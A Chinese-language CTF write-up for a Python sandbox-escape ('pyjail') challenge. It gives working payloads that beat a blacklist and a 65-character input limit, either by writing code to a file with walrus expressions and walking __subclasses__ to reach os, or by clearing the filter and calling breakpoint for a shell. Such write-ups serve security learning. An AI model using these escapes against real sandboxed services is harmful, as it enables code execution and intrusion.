# Pyjail ! It's myRevenge !!!

> 分类：Misc

## 题目描述

加强版 pyjail 沙盒。黑名单更长、限制输入 <65 字符且需含 `{}`，通过 `eval(f"f'{input_code}'")` 执行。需绕过限制获取 shell。

## 考察知识点

- Python pyjail 沙盒绕过
- 海象表达式 + 写文件绕过长度限制
- 劫持 `breakpoint` / `my_filter` / `len` 函数

## 解法

方法一：海象表达式把代码分段写入文件，再读取执行：

```python
{open("A","w").write("{(a:=().__cla"+"ss__.__bases__[0]")}
{open("A","a").write(",open(chr(66)).read())[1]}")}
# ... 依次写 A/B/C/D/E/F，构建 __subclasses__ 链
{(my_filter:=lambda x:True,open("A").read())[1]}
```

最终利用 `().__class__.__bases__[0].__subclasses__()[104]().load_module(chr(111)+chr(115))` 取到 os。

方法二：清空黑名单 / 劫持 breakpoint，利用交互式调试：

```
{(a:=list(globals().values()),a[-2].clear(),"{inp"+"ut()}")[2]}
{globals()["__bu"+"iltins__"].breakpoint()}
```

进入 breakpoint 后 `import os; os.listdir("/")` 找 flag 文件，再 `print(open("flag_xxx").read())`。

## 参考答案

（flag 通过沙盒逃逸后读取动态生成的 flag 文件）

## 来源

- 作者：m1ao | https://xz.aliyun.com/news/12701
- 作者：天格战队 | https://blog.csdn.net/zzz6583zz/article/details/141131947
- https://cn-sec.com/archives/2314955.html
